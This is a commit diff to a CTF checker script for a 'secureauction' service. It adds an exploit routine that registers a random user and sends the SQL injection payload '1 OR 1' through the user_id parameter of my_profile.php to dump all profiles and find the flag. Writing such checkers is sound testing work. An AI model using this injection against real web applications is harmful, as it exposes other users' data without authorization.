cd0b0fa3026eb6aecbe1910cfc4c5fabc3a76c52
KutalVolkan <vkutal@outlook.com>
2023-06-01 18:28:18 +0200

    exploit works but only get response.txt, probably need to scrapte the data of it or maybe task.flag

--- checker/src/checker.py
+++ checker/src/checker.py
@@ -2,10 +2,13 @@ from asyncio import StreamReader, StreamWriter
 import asyncio
 import random
 import string
+import re
 import faker
 from httpx import AsyncClient, Response
 from typing import Optional
 from logging import LoggerAdapter
+
+
 
 from enochecker3 import (
     ChainDB,
@@ -25,6 +28,11 @@ from enochecker3 import (
     AsyncSocket,
 )
 from enochecker3.utils import assert_equals, assert_in
+
+import logging
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
+
 
 checker = Enochecker("secureauction", 8181)
 app = lambda: checker.app
@@ -117,6 +125,44 @@ async def getflag_note(
     logger.debug(response.text)
 
     assert_in(task.flag, response.text, "Flag missing")
+
+@checker.exploit(0)
+async def exploit(
+    task: ExploitCheckerTaskMessage,
+    client: AsyncClient,
+    searcher: FlagSearcher,
+    logger: LoggerAdapter  # add this parameter to your function
+) -> Optional[str]:
+
+    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
+    password = ''.join(random.choices(string.ascii_lowercase, k=10))
+
+    logger.debug(f"Generated user_name: {user_name}")
+    logger.debug(f"Generated password: {password}")
+
+    await signup(client, user_name, password)
+    await login(client, user_name, password)
+
+    # SQL Injection payload, returning all records regardless of the user_id.
+    SQL_INJECTION_PAYLOAD = "1 OR 1"
+    exploit_url = f"/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"
+
+    response = await client.get(exploit_url)
+
+    logger.debug(f"Exploit response status code: {response.status_code}")
+    logger.debug(f"Exploit response text: {response.text}")
+
+    if response.status_code == 200:
+        # look for the flag directly
+        if task.flag in response.text:
+            return task.flag
+        else:
+            logger.warning("Flag not found in the response.")
+    else:
+        logger.warning("Exploit request failed.")
+        raise MumbleException("Exploit Failed!")
+
+
 
 
 if __name__ == "main":
